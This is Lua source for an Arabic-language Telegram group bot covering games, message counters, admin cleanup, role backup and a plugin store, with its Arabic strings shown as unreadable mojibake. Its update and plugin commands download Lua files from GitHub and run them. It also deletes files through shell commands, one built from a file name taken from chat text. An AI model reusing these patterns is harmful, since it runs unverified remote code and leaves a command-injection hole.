name = string.gsub(name,"ΩΩΨ­ΩΩ","Ψ§Ψ¬Ω___ΨΉΩΨ§ΩΨ§")
send(msg.chat_id_, msg.id_,"π‘βΏΨ§Ψ³Ψ±ΨΉ ΩΨ§Ψ­Ψ― ΩΩΩΩ Ψ§ΩΩΨ«Ω ~ {"..name.."}")
return false
end
end
if text == ""..(database:get(bot_id.."Tshak:Set:Amth"..msg.chat_id_) or "").."" then 
if not database:get(bot_id.."Tshak:Set:Amth:Bot"..msg.chat_id_) then 
database:del(bot_id.."Tshak:Set:Amth"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"πβΏΨ§ΩΩ ΩΨ¨Ψ±ΩΩ ΩΩΨ― ΩΨ²Ψͺ \nβ»βΏΩΩΨΉΨ¨ ΩΨ±Ω Ψ§Ψ?Ψ±Ω Ψ§Ψ±Ψ³Ω ~{ Ψ§ΩΨ«ΩΩ }")
database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_, 1)  
end
database:set(bot_id.."Tshak:Set:Amth:Bot"..msg.chat_id_,true)
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨" and Owner(msg) then   
database:del(bot_id.."Tshak:Lock:Games"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"\nπ΄βΏΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨") 
end
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨" and Owner(msg) then  
database:set(bot_id.."Tshak:Lock:Games"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,"\nπ’βΏΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨") 
end
if text == 'Ψ§ΩΨ§ΩΨΉΨ§Ψ¨' then
Teext = [[
π‘βΏΩΨ§Ψ¦ΩΩ Ψ§ΩΨΉΨ§Ψ¨ Ψ³ΩΨ±Ψ³ Ψ§ΩΩΨ§
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β» 
π βΏΩΨΉΨ¨Ψ© Ψ§ΩΨ¨Ψ§Ψͺ Β» Ψ¨Ψ§Ψͺ
π§­βΏΩΨΉΨ¨Ψ© Ψ§ΩΨͺΨ?ΩΩΩ Β» Ψ?ΩΩ
βοΈβΏΩΨΉΨ¨Ω Ψ§ΩΨ§Ψ³Ψ±ΨΉ Β» Ψ§ΩΨ§Ψ³Ψ±ΨΉ
π¨βΏΩΨΉΨ¨Ψ© Ψ§ΩΨ³ΩΨ§ΩΩΨ§Ψͺ Β» Ψ³ΩΨ§ΩΩΨ§Ψͺ
πβΏΩΨΉΨ¨Ψ© Ψ§ΩΩΨ?ΨͺΩΩ Β» Ψ§ΩΩΨ?ΨͺΩΩ
πΌβΏΩΨΉΨ¨Ψ© Ψ§ΩΨ§ΩΨ«ΩΩ Β» Ψ§ΩΨ«ΩΩ
π§ΏβΏΩΨΉΨ¨Ψ© Ψ§ΩΨΉΩΨ³ Β» Ψ§ΩΨΉΩΨ³ 
βοΈβΏΩΨΉΨ¨Ψ© Ψ§ΩΨ§Ψ³Ψ¦ΩΩ Ψ§ΩΨ°ΩΩΩ Β» Ψ§ΩΨ§Ψ³Ψ¦ΩΩ
β³οΈβΏΩΨΉΨ¨Ψ© Ψ§ΩΩΨΉΨ§ΩΩ Β» ΩΨΉΨ§ΩΩ
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β» 
πβΏΩΨ¬ΩΩΨ±Ψ§ΨͺΩ Β» ΩΨΉΨ±ΨΆ ΨΉΨ―Ψ― Ψ§ΩΨ§Ψ±Ψ¨Ψ§Ψ­
πβΏΨ¨ΩΨΉ ΩΨ¬ΩΩΨ±Ψ§ΨͺΩ + Ψ§ΩΨΉΨ―Ψ― Β» ΩΨ³ΨͺΨ¨Ψ―Ψ§Ω ΩΩ ΩΨ¬ΩΩΨ±Ω Ψ¨50 Ψ±Ψ³Ψ§ΩΩ
]]
send(msg.chat_id_, msg.id_,Teext) 
end
if text == 'Ψ±Ψ³Ψ§Ψ¦ΩΩ' then
local nummsg = database:get(bot_id..'Tshake:messageUser'..msg.chat_id_..':'..msg.sender_user_id_) or 1
local Text = 'π¨βΏΨΉΨ―Ψ― Ψ±Ψ³Ψ§Ψ¦ΩΩ ΩΩΨ§ *~ '..nummsg..'*'
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'ΩΨ³Ψ­ Ψ±Ψ³Ψ§Ψ¦ΩΩ' then
database:del(bot_id..'Tshake:messageUser'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = 'ββΏΨͺΩ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ±Ψ³Ψ§Ψ¦ΩΩ '
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'Ψ³Ψ­ΩΨ§ΨͺΩ' or text == 'ΨͺΨΉΨ―ΩΩΨ§ΨͺΩ' then
local edit = database:get(bot_id..'Tshake:message_edit'..msg.chat_id_..msg.sender_user_id_) or 0
local Text = 'ββΏΨΉΨ―Ψ― Ψ§ΩΨͺΨΉΨ―ΩΩΨ§Ψͺ ΩΩΨ§ *~ '..edit..'*'
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'ΩΨ³Ψ­ Ψ³Ψ­ΩΨ§ΨͺΩ' or text == 'ΩΨ³Ψ­ ΨͺΨΉΨ―ΩΩΨ§ΨͺΩ' then
database:del(bot_id..'Tshake:message_edit'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = 'ββΏΨͺΩ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ ΨͺΨΉΨ―ΩΩΨ§ΨͺΩ '
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'Ψ¬ΩΨ§ΨͺΩ' then
local addmem = database:get(bot_id.."Tshake:Add:Memp"..msg.chat_id_..":"..msg.sender_user_id_) or 0
local Text = 'β¬οΈβΏΨΉΨ―Ψ― Ψ¬ΩΨ§ΨͺΩ Ψ§ΩΩΨΆΨ§ΩΩ * β« '..addmem..'*'
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'ΩΨ³Ψ­ Ψ¬ΩΨ§ΨͺΩ' then
database:del(bot_id..'Tshake:Add:Memp'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = 'ββΏΨͺΩ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ¬ΩΨ§ΨͺΩ Ψ§ΩΩΨΆΨ§ΩΩ '
send(msg.chat_id_, msg.id_,Text) 
end

if text == "ΩΨ¬ΩΩΨ±Ψ§ΨͺΩ" then 
local Num = database:get(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_) or 0
if Num == 0 then 
Text = "β«οΈβΏΩΩ ΨͺΩΨΉΨ¨ Ψ§Ω ΩΨΉΨ¨Ω ΩΩΨ­Ψ΅ΩΩ ΨΉΩΩ Ψ¬ΩΨ§ΩΨ±"
else
Text = "πβΏΨΉΨ―Ψ― Ψ¬ΩΨ§ΩΨ± Ψ§ΩΨͺΩ Ψ±Ψ­Ψ¨ΨͺΩΨ§ ΩΩ *~ { "..Num.." } ΩΨ¬ΩΩΨ±Ω *"
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and text:match("^Ψ¨ΩΨΉ ΩΨ¬ΩΩΨ±Ψ§ΨͺΩ (%d+)$") then
local NUMPY = text:match("^Ψ¨ΩΨΉ ΩΨ¬ΩΩΨ±Ψ§ΨͺΩ (%d+)$") 
if tonumber(NUMPY) == tonumber(0) then
send(msg.chat_id_,msg.id_,"\n*π βΏΩΨ§ Ψ§Ψ³ΨͺΨ·ΩΨΉ Ψ§ΩΨ¨ΩΨΉ Ψ§ΩΩ ΩΩ 1 *") 
return false 
end
if tonumber(database:get(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_)) == tonumber(0) then
send(msg.chat_id_,msg.id_,"π¨βΏΩΩΨ³ ΩΨ―ΩΩ Ψ¬ΩΨ§ΩΨ± ΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨ \nπβΏΨ§Ψ°Ψ§ ΩΩΨͺ ΨͺΨ±ΩΨ― Ψ±Ψ¨Ψ­ Ψ§ΩΨ¬ΩΨ§ΩΨ± \nπβΏΨ§Ψ±Ψ³Ω Ψ§ΩΨ§ΩΨΉΨ§Ψ¨ ΩΨ§Ψ¨Ψ―Ψ£ Ψ§ΩΩΨΉΨ¨ ! ") 
else
local NUM_GAMES = database:get(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_)
if tonumber(NUMPY) > tonumber(NUM_GAMES) then
send(msg.chat_id_,msg.id_,"\nπβΏΩΩΨ³ ΩΨ―ΩΩ Ψ¬ΩΨ§ΩΨ± Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΨΉΨ―Ψ― \nπβΏΩΨ²ΩΨ§Ψ―Ψ© ΩΨ¬ΩΩΨ±Ψ§ΨͺΩ ΩΩ Ψ§ΩΩΨΉΨ¨Ω \nπβΏΨ§Ψ±Ψ³Ω Ψ§ΩΨ§ΩΨΉΨ§Ψ¨ ΩΨ§Ψ¨Ψ―Ψ£ Ψ§ΩΩΨΉΨ¨ !") 
return false 
end
local NUMNKO = (NUMPY * 50)
database:decrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_,NUMPY)  
database:incrby(bot_id.."Tshake:messageUser"..msg.chat_id_..":"..msg.sender_user_id_,NUMNKO)  
send(msg.chat_id_,msg.id_,"ββΏΨͺΩ Ψ?Ψ΅Ω *~ { "..NUMPY.." }* ΩΩ ΩΨ¬ΩΩΨ±Ψ§ΨͺΩ \nπ¨βΏΩΨͺΩ Ψ§ΨΆΨ§ΩΨ©* ~ { "..(NUMPY * 50).." } Ψ±Ψ³Ψ§ΩΩ Ψ§ΩΩ Ψ±Ψ³Ψ§ΩΩ *")
end 
return false 
end
if text ==("ΩΨ³Ψ­") and Addictive(msg) and tonumber(msg.reply_to_message_id_) > 0 then
DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.reply_to_message_id_),msg.id_})   
end   
if database:get(bot_id.."Tshak:numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘$") then 
database:del(bot_id.."Tshak:id:user"..msg.chat_id_)  
send(msg.chat_id_, msg.id_, "π βΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§ΩΨ± ") 
database:del(bot_id.."Tshak:numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."Tshak:numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = database:get(bot_id.."Tshak:id:user"..msg.chat_id_)  
database:del(bot_id.."Tshak:Msg_User"..msg.chat_id_..":"..msg.sender_user_id_) 
database:incrby(bot_id.."Tshake:messageUser"..msg.chat_id_..":"..iduserr,numadded)  
send(msg.chat_id_, msg.id_,"ββΏΨͺΩ Ψ§ΨΆΨ§ΩΨ© ΩΩ {"..numadded.."} ΩΩ Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω")  
end
if database:get(bot_id.."Tshak:gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘$") then 
database:del(bot_id.."Tshak:idgem:user"..msg.chat_id_)  
send(msg.chat_id_, msg.id_, "ββΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§ΩΨ± ") 
database:del(bot_id.."Tshak:gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."Tshak:gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = database:get(bot_id.."Tshak:idgem:user"..msg.chat_id_)  
database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..iduserr,numadded)  
send(msg.chat_id_, msg.id_,"ββΏΨͺΩ Ψ§ΨΆΨ§ΩΨ© ΩΩ {"..numadded.."} ΩΩ Ψ§ΩΩΨ¬ΩΩΨ±Ψ§Ψͺ")  
end
------------------------------------------------------------
if text and text:match("^Ψ§ΨΆΩ Ψ±Ψ³Ψ§Ψ¦Ω (%d+)$") and msg.reply_to_message_id_ == 0 and Constructor(msg) then    
taha = text:match("^Ψ§ΨΆΩ Ψ±Ψ³Ψ§Ψ¦Ω (%d+)$")
database:set(bot_id.."Tshak:id:user"..msg.chat_id_,taha)  
database:setex(bot_id.."Tshak:numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_, msg.id_, "ββΏΨ§Ψ±Ψ³Ω ΩΩ ΨΉΨ―Ψ― Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω Ψ§ΩΨ§Ω") 
return false
end
if text and text:match("^Ψ§ΨΆΩ ΩΨ¬ΩΩΨ±Ψ§Ψͺ (%d+)$") and msg.reply_to_message_id_ == 0 and Constructor(msg) then  
taha = text:match("^Ψ§ΨΆΩ ΩΨ¬ΩΩΨ±Ψ§Ψͺ (%d+)$")
database:set(bot_id.."Tshak:idgem:user"..msg.chat_id_,taha)  
database:setex(bot_id.."Tshak:gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_, msg.id_, "π βΏΨ§Ψ±Ψ³Ω ΩΩ ΨΉΨ―Ψ― Ψ§ΩΩΨ¬ΩΩΨ±Ψ§Ψͺ Ψ§ΩΨ§Ω") 
return false
end
if text and text:match("^Ψ§ΨΆΩ ΩΨ¬ΩΩΨ±Ψ§Ψͺ (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^Ψ§ΨΆΩ ΩΨ¬ΩΩΨ±Ψ§Ψͺ (%d+)$")
function reply(extra, result, success)
database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..result.sender_user_id_,Num)  
send(msg.chat_id_, msg.id_,"ββΏΨͺΩ Ψ§ΨΆΨ§ΩΨ© ΩΩ {"..Num.."} ΩΩ Ψ§ΩΩΨ¬ΩΩΨ±Ψ§Ψͺ")  
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
end
if text and text:match("^Ψ§ΨΆΩ Ψ±Ψ³Ψ§Ψ¦Ω (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^Ψ§ΨΆΩ Ψ±Ψ³Ψ§Ψ¦Ω (%d+)$")
function reply(extra, result, success)
database:del(bot_id.."Tshak:Msg_User"..msg.chat_id_..":"..result.sender_user_id_) 
database:incrby(bot_id.."Tshake:messageUser"..msg.chat_id_..":"..result.sender_user_id_,Num)  
send(msg.chat_id_, msg.id_, "\nββΏΨͺΩ Ψ§ΨΆΨ§ΩΨ© ΩΩ {"..Num.."} ΩΩ Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω")  
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
end

if text == "ΨͺΩΨΈΩΩ Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ" and DevTshake(msg) then
local pv = database:smembers(bot_id..'Tshake:UsersBot')  
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,data) 
if data.ID and data.ID == "Ok"  then
print('\27[30;33mΒ»Β» THE USER IS SAVE ME β\nΒ»Β» '..pv[i]..'\n\27[1;37m')
else
print('\27[30;31mΒ»Β» THE USER IS BLOCK ME β\nΒ»Β» '..pv[i]..'\n\27[1;37m')
database:srem(bot_id..'Tshake:UsersBot',pv[i])  
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,'π€βΏΩΨ§ ΩΩΨ¬Ψ― ΩΨ΄ΨͺΨ±ΩΩΩ ΩΩΩΩΩΩ')   
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,'*π₯βΏΨΉΨ―Ψ― Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ Ψ§ΩΨ§Ω ~ '..#pv..'\nπβΏΨͺΩ Ψ§ΩΨΉΨ«ΩΨ± ΨΉΩΩ ~ '..sendok..' ΩΨ΄ΨͺΨ±Ω ΩΨ§Ω Ψ¨Ψ­ΨΈΨ± Ψ§ΩΨ¨ΩΨͺ\nββΏΨ§Ψ΅Ψ¨Ψ­ ΨΉΨ―Ψ― Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ Ψ§ΩΨ§Ω ~ '..ok..' ΩΨ΄ΨͺΨ±Ω *')   
end
end
end,nil)
end,nil)
end
return false
end
if text == "ΨͺΩΨΈΩΩ ΩΨ§ΩΨ¬Ψ±ΩΨ¨Ψ§Ψͺ" and DevTshake(msg) then
local group = database:smembers(bot_id..'Tshake:Chek:Groups')  
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
print('\27[30;34mΒ»Β» THE BOT IS NOT ADMIN β\nΒ»Β» '..group[i]..'\n\27[1;37m')
database:srem(bot_id..'Tshake:Chek:Groups',group[i])  
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
database:srem(bot_id..'Tshake:Chek:Groups',group[i])  
q = q + 1
print('\27[30;35mΒ»Β» THE BOT IS LEFT GROUP β\nΒ»Β» '..group[i]..'\n\27[1;37m')
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
database:srem(bot_id..'Tshake:Chek:Groups',group[i])  
q = q + 1
print('\27[30;36mΒ»Β» THE BOT IS KICKED GROUP β\nΒ»Β» '..group[i]..'\n\27[1;37m')
end
if data and data.code_ and data.code_ == 400 then
database:srem(bot_id..'Tshake:Chek:Groups',group[i])  
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,'π₯βΏΩΨ§ ΨͺΩΨ¬Ψ― ΩΨ¬ΩΩΨΉΨ§Ψͺ ΩΩΩΩΩ ')   
else
local taha = (w + q)
local sendok = #group - taha
if q == 0 then
taha = ''
else
taha = '\nπ―βΏ ΨͺΩ Ψ§Ψ²Ψ§ΩΨ© ~ '..q..' ΩΨ¬ΩΩΨΉΨ§Ψͺ ΩΩ Ψ§ΩΨ¨ΩΨͺ'
end
if w == 0 then
storm = ''
else
storm = '\nπ―βΏ ΨͺΩ Ψ§Ψ²Ψ§ΩΨ© ~'..w..' ΩΨ¬ΩΩΨΉΩ ΩΨ§Ω Ψ§ΩΨ¨ΩΨͺ ΨΉΨΆΩ'
end
send(msg.chat_id_, msg.id_,'*??βΏ ΨΉΨ―Ψ― Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ Ψ§ΩΨ§Ω ~ '..#group..' ΩΨ¬ΩΩΨΉΩ '..storm..''..taha..'\nπβΏΨ§Ψ΅Ψ¨Ψ­ ΨΉΨ―Ψ― Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ Ψ§ΩΨ§Ω ~ '..sendok..' ΩΨ¬ΩΩΨΉΨ§Ψͺ*\n')   
end
end
end,nil)
end
return false
end
if text == ("ΨͺΨ­Ψ―ΩΨ« Ψ§ΩΨ³ΩΨ±Ψ³") and DevTshake(msg) then  
send(msg.chat_id_,msg.id_,'ββΏΨͺΩ Ψ§ΩΨͺΨ­Ψ―ΩΨ«')
os.execute('rm -rf Tshake.lua')
os.execute('rm -rf start.lua')
download_to_file('https://raw.githubusercontent.com/amrjava/alfapro/main/Tshake.lua', 'Tshake.lua') 
download_to_file('https://raw.githubusercontent.com/amrjava/alfapro/main/start.lua', 'start.lua') 
dofile('Tshake.lua')  
return false
end


if text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ' and DevTshake(msg) then  
database:del(bot_id..'Tshake:Free:Add:Bots') 
send(msg.chat_id_, msg.id_,'ββΏΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ ') 
end
if text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ' and DevTshake(msg) then  
database:set(bot_id..'Tshake:Free:Add:Bots',true) 
send(msg.chat_id_, msg.id_,'ββΏΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ') 
end
if text and text:match("^ΨͺΨΉΩΩ ΨΉΨ―Ψ― Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘ (%d+)$") and DevTshake(msg) then
local Num = text:match("ΨͺΨΉΩΩ ΨΉΨ―Ψ― Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘ (%d+)$") 
database:set(bot_id..'Tshake:Num:Add:Bot',Num) 
send(msg.chat_id_, msg.id_,'π₯βΏ ΨͺΩ ΩΨΆΨΉ ΨΉΨ―Ψ― Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘ *~'..Num..'* ΨΉΨΆΩ')
end
if text =='Ψ§ΩΨ§Ψ­Ψ΅Ψ§Ψ¦ΩΨ§Ψͺ' and DevBot(msg) then
local Groups = database:scard(bot_id..'Tshake:Chek:Groups')  
local Users = database:scard(bot_id..'Tshake:UsersBot')  
send(msg.chat_id_, msg.id_,'πβΏΨ§Ψ­Ψ΅Ψ§Ψ¦ΩΨ§Ψͺ Ψ§ΩΨ¨ΩΨͺ \n\nπ₯βΏΨΉΨ―Ψ― Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ *~ '..Groups..'\nπ€βΏΨΉΨ―Ψ― Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ ~ '..Users..'*')
end
if text == 'Ψ¬ΩΨ¨ ΩΨ³Ψ?Ω Ψ§Ψ­ΨͺΩΨ§Ψ·ΩΩ' and DevTshake(msg) then
local list = database:smembers(bot_id..'Tshake:Chek:Groups')  
local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
for k,v in pairs(list) do   
NAME = 'Tshake Chat'
ASAS = database:smembers(bot_id.."Tshake:Basic:Constructor"..v)
MNSH = database:smembers(bot_id.."Tshake:Constructor"..v)
MDER = database:smembers(bot_id.."Tshake:Manager"..v)
MOD = database:smembers(bot_id.."Tshake:Mod:User"..v)
link = database:get(bot_id.."Tshake:Link_Group"..v) or ''
if k == 1 then
t = t..'"'..v..'":{"Tshake":"'..NAME..'",'
else
t = t..',"'..v..'":{"Tshake":"'..NAME..'",'
end
if #ASAS ~= 0 then 
t = t..'"ASAS":['
for k,v in pairs(ASAS) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MOD ~= 0 then
t = t..'"MOD":['
for k,v in pairs(MOD) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MDER ~= 0 then
t = t..'"MDER":['
for k,v in pairs(MDER) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MNSH ~= 0 then
t = t..'"MNSH":['
for k,v in pairs(MNSH) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'"linkgroup":"'..link..'"}' or ''
end
t = t..'}}'
local File = io.open('./File_Libs/'..bot_id..'.json', "w")
File:write(t)
File:close()
sendDocument(msg.chat_id_, msg.id_,'./File_Libs/'..bot_id..'.json', 'π βΏ ΨΉΨ―Ψ― ΩΨ¬ΩΩΨΉΨ§Ψͺ Ψ§ΩΨͺΩ ΩΩ Ψ§ΩΨ¨ΩΨͺ { '..#list..'}')
end
if text == "Ψ§ΩΩΨ·ΩΨ±" or text == "ΩΨ·ΩΨ±" then

if text == 'Ψ§ΩΩΩΩΨ§Ψͺ' and DevTshake(msg) then
t = 'ββΏΨ¬ΩΩΨΉ Ψ§ΩΩΩΩΨ§Ψͺ : \n Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β» \n'
i = 0
for v in io.popen('ls Tshake_Files'):lines() do
if v:match(".lua$") then
i = i + 1
t = t..i..'*~ '..v..'*\n'
end
end
send(msg.chat_id_, msg.id_,t)
end
if text == "Ω" or text == 'Ω' then
if DevTshake(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/TEAMTshakeX/files_tshake/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\nπβΏΨ§ΩΩΨ§ Ψ¨Ω ΩΩ ΩΨͺΨ¬Ψ± ΩΩΩΨ§Ψͺ Ψ§ΩΩΨ§x \nπ βΏΨ§ΩΩΩΩΨ§Ψͺ Ψ§ΩΩΩΨ¬ΩΨ―Ω Ψ­Ψ§ΩΩΨ§ \nκΉΒ«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»κΉ\n\n"
local TextE = "\nκΉΒ«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»κΉ\nπβΏΨͺΨ―Ω ΨΉΩΨ§ΩΨ© (β) Ψ§ΩΩΩΩ ΩΩΨΉΩ\n".."πβΏΨͺΨ―Ω ΨΉΩΨ§ΩΨ© (β) Ψ§ΩΩΩΩ ΩΨΉΨ·Ω\n"
local NumFile = 0
for name,Info in pairs(res.plugins_) do
local Check_File_is_Found = io.open("Tshake_Files/"..name,"r")
if Check_File_is_Found then
io.close(Check_File_is_Found)
CeckFile = "(β)"
else
CeckFile = "(β)"
end
NumFile = NumFile + 1
TextS = TextS..'*'..NumFile.."~βͺΌ* {`"..name..'`} Β» '..CeckFile..'\n[- File Information]('..Info..')\n'
end
send(msg.chat_id_, msg.id_,TextS..TextE) 
end
else
send(msg.chat_id_, msg.id_,"π βΏ ΩΨ§ ΩΩΨ¬Ψ― Ψ§ΨͺΨ΅Ψ§Ω ΩΩ Ψ§Ω api \n") 
end
return false
end
end

if text and text:match("^(ΨͺΨΉΨ·ΩΩ ΩΩΩ) (.*)(.lua)$") and DevTshake(msg) then
local name_t = {string.match(text, "^(ΨͺΨΉΨ·ΩΩ ΩΩΩ) (.*)(.lua)$")}
local file = name_t[2]..'.lua'
local file_bot = io.open("Tshake_Files/"..file,"r")
if file_bot then
io.close(file_bot)
t = "*πβΏ Ψ§ΩΩΩΩ Β» {"..file.."}\nπβΏ ΨͺΩ ΨͺΨΉΨ·ΩΩΩ ΩΨ­Ψ°ΩΩ Ψ¨ΩΨ¬Ψ§Ψ­ \nβοΈ*"
else
t = "*πβΏ Ψ¨Ψ§ΩΨͺΨ§ΩΩΨ― ΨͺΩ ΨͺΨΉΨ·ΩΩ ΩΨ­Ψ°Ω ΩΩΩ Β» {"..file.."} \nβοΈ*"
end
local json_file, res = https.request("https://raw.githubusercontent.com/TEAMTshakeX/files_tshake/master/files_tshake/"..file)
if res == 200 then
os.execute("rm -fr Tshake_Files/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DDDDiD.lua')  
else
send(msg.chat_id_, msg.id_,"*π βΏ ΨΉΨ°Ψ±Ψ§ ΩΨ§ ΩΩΨ¬Ψ― ΩΨ§ΩΨ°Ψ§ ΩΩΩ ΩΩ Ω *\n") 
end
return false
end
if text and text:match("^(ΨͺΩΨΉΩΩ ΩΩΩ) (.*)(.lua)$") and DevTshake(msg) then
local name_t = {string.match(text, "^(ΨͺΩΨΉΩΩ ΩΩΩ) (.*)(.lua)$")}
local file = name_t[2]..'.lua'
local file_bot = io.open("Tshake_Files/"..file,"r")
if file_bot then
io.close(file_bot)
t = "*πβΏ Ψ¨Ψ§ΩΨͺΨ§ΩΩΨ― ΨͺΩ ΨͺΩΨ²ΩΩ ΩΨͺΩΨΉΩΩ ΩΩΩ Β» {"..file.."} \nβοΈ*"
else
t = "*πβΏ Ψ§ΩΩΩΩ Β» {"..file.."}\nπβΏ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΨͺΩΨΉΩΩΩ Ψ¨ΩΨ¬Ψ§Ψ­ \nπ₯*"
end
local json_file, res = https.request("https://raw.githubusercontent.com/TEAMTshakeX/files_tshake/master/files_tshake/"..file)
if res == 200 then
local chek = io.open("Tshake_Files/"..file,'w+')
chek:write(json_file)
chek:close()
send(msg.chat_id_, msg.id_,t) 
dofile('DDDDiD.lua')  
else
send(msg.chat_id_, msg.id_,"*π βΏ ΨΉΨ°Ψ±Ψ§ ΩΨ§ ΩΩΨ¬Ψ― ΩΨ§ΩΨ°Ψ§ ΩΩΩ ΩΩ Ω *\n") 
end
return false
end
if text == "ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ§ΩΩΩΩΨ§Ψͺ" and DevTshake(msg) then
os.execute("rm -fr Tshake_Files/*")
send(msg.chat_id_,msg.id_,"ββΏΨͺΩ Ψ­Ψ°Ω Ψ¬ΩΩΨΉ Ψ§ΩΩΩΩΨ§Ψͺ")
return false
end
